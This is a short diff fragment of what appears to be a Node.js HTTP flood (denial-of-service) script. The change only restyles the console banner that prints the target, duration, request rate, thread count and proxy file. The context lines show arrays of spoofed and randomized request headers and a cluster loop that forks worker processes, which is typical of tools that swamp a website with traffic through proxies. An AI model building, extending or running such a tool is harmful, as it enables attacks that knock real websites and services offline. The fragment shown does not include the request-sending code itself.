@@ -84,11 +84,13 @@ const rateHeaders3=[{'cookie':randstr(15)},{'Expect':'100-continue'},{'Forwarded
 const rateHeaders4=[{'accept-encoding':encoding},{'accept-language':lang},{'Refresh':'5'},{'X-Content-duration':spoofed},{'service-worker-navigation-preload':Math.random()<0.5?'true':'null'}];
 if(cluster.isMaster){
 	console.clear();
-	console.log('Target: '.brightYellow+process.argv[2]);
-	console.log('Time: '.brightYellow+process.argv[3]);
-	console.log('Rate: '.brightYellow+process.argv[4]);
-	console.log('Thread: '.brightYellow+process.argv[5]);
-	console.log('ProxyFile: '.brightYellow+process.argv[6]);
+	console.log('--------------------------------------------'.gray);
+	console.log('Target: '.brightRed+process.argv[2]);
+	console.log('Duration: '.brightRed+process.argv[3]);
+	console.log('Rate: '.brightRed+process.argv[4]);
+	console.log('Thread(s): '.brightRed+process.argv[5]);
+	console.log('Proxy: '.brightRed+process.argv[6]);
+	console.log('--------------------------------------------'.gray);
 	for(let counter=1;counter<=args.threads;counter++){
 		cluster.fork();
 	}
